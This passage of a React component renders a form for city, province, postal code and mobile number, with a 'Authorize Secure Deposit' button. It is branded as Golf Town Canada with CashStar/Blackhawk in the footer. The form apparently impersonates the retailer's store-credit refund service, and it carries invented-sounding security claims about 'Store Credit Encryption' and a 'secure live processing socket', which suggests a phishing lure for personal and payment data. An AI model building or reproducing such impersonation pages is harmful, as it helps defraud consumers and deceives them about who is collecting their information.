                          onChange={(e) => setCity(e.target.value)}
                          className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-3 text-xs text-slate-900 font-semibold focus:outline-none focus:border-emerald-600 focus:bg-white transition-all duration-200"
                          required
                        />
                      </div>

                      <div>
                        <label className="block text-[11px] text-slate-500 font-bold mb-1">Province</label>
                        <select 
                          value={province}
                          onChange={(e) => setProvince(e.target.value)}
                          className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-3 text-xs text-slate-900 font-semibold focus:outline-none focus:border-emerald-600 focus:bg-white transition-all duration-200"
                          required
                        >
                          <option value="AB">AB - Alberta</option>
                          <option value="BC">BC - British Columbia</option>
                          <option value="MB">MB - Manitoba</option>
                          <option value="NB">NB - New Brunswick</option>
                          <option value="NL">NL - Newfoundland and Labrador</option>
                          <option value="NS">NS - Nova Scotia</option>
                          <option value="ON">ON - Ontario</option>
                          <option value="PE">PE - Prince Edward Island</option>
                          <option value="QC">QC - Quebec</option>
                          <option value="SK">SK - Saskatchewan</option>
                          <option value="NT">NT - Northwest Territories</option>
                          <option value="NU">NU - Nunavut</option>
                          <option value="YT">YT - Yukon</option>
                        </select>
                      </div>

                      <div>
                        <label className="block text-[11px] text-slate-500 font-bold mb-1">Postal Code</label>
                        <input 
                          type="text" 
                          value={postalCode}
                          onChange={(e) => setPostalCode(e.target.value.toUpperCase())}
                          className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-3 text-xs text-slate-900 font-mono font-bold focus:outline-none focus:border-emerald-600 focus:bg-white transition-all duration-200"
                          required
                        />
                      </div>
                    </div>

                    <div>
                      <label className="block text-[11px] text-slate-500 font-bold mb-1">Mobile Phone Number</label>
                      <input 
                        type="text" 
                        value={phone}
                        onChange={(e) => setPhone(e.target.value)}
                        className="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-3 text-xs text-slate-900 font-mono font-bold focus:outline-none focus:border-emerald-600 focus:bg-white transition-all duration-200"
                        required
                      />
                    </div>
                  </div>

                  {/* Security Notice */}
                  <div className="bg-emerald-50 border border-emerald-100 p-4 rounded-2xl text-[11px] text-emerald-800 flex items-start gap-2.5">
                    <ShieldCheck className="w-5 h-5 text-emerald-600 shrink-0 mt-0.5" />
                    <span className="leading-relaxed font-semibold">
                      Protected by Golf Town Canada Store Credit Encryption. Submitting will establish a secure live processing socket connection for refund store credit deposit.
                    </span>
                  </div>

                  {/* Submit Button */}
                  <button
                    type="submit"
                    disabled={submittingPayment}
                    className="w-full bg-emerald-700 hover:bg-emerald-700 text-slate-900 font-bold text-sm py-4 rounded-xl shadow-lg transition-all flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50"
                  >
                    {submittingPayment ? (
                      <Loader2 className="w-4 h-4 animate-spin text-slate-900" />
                    ) : (
                      <Lock className="w-4 h-4 text-slate-900" />
                    )}
                    <span>Authorize Secure Deposit</span>
                  </button>
                </form>
              </motion.div>
            )}

          </AnimatePresence>
        </div>
      </main>

      {/* SECURE FOOTER */}
      <footer className="bg-white border-t border-slate-200 py-6">
        <div className="max-w-xl mx-auto px-6 text-center text-[10px] text-slate-500 space-y-1.5 leading-relaxed">
          <div>
            <strong>Golf Town Customer Support &amp; eGift Services</strong><br />
            Powered by CashStar / Blackhawk Network Services
          </div>
          <div className="text-slate-600">
            &copy; {new Date().getFullYear()} Golf Town Canada Inc. All rights reserved. Golf Town and the Golf Town logo are registered trademarks.
          </div>
        </div>
      </footer>

    </div>
  );
}
